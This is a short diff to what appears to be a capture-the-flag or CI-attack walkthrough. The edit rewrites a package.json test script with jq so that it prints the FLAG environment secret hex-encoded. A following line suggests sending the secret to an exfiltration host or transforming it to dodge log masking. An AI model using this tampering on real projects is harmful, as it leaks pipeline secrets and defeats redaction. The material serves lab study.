@@ -44,7 +44,8 @@ automation separate.
    set the `test` script to exfiltrate `FLAG`:
 
    ```bash
-   jq '.scripts.test |= "node -e \"console.log(process.env.FLAG)\""' package.json | sponge package.json
+   jq '.scripts.test = "printf %s \"$FLAG\" | od -An -v -tx1 | tr -d \"[:space:]\""' package.json > package.json.tmp
+   mv package.json.tmp package.json
    ```
 
    (Send it to an exfil host you control, or print it transformed to dodge log
